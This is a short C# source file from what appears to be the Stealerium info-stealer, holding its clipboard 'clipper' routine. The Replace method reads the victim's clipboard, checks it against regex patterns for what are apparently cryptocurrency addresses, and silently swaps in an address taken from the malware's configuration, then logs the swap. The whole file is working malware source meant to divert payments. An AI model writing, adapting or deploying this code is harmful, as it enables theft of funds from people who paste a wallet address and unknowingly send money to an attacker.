using System.Collections.Generic;
using System.Text.RegularExpressions;
using Stealerium.Helpers;

namespace Stealerium.Clipper;

internal sealed class Buffer
{
	public static void Replace()
	{
		string clipboardText = ClipboardManager.ClipboardText;
		if (string.IsNullOrEmpty(clipboardText))
		{
			return;
		}
		foreach (KeyValuePair<string, Regex> patterns in RegexPatterns.PatternsList)
		{
			string key = patterns.Key;
			if (patterns.Value.Match(clipboardText).Success)
			{
				string text = Config.ClipperAddresses[key];
				if (!string.IsNullOrEmpty(text) && !text.Contains("---") && !clipboardText.Equals(text))
				{
					Clipboard.SetText(text);
					Logging.Log("Clipper replaced to " + text);
					break;
				}
			}
		}
	}
}
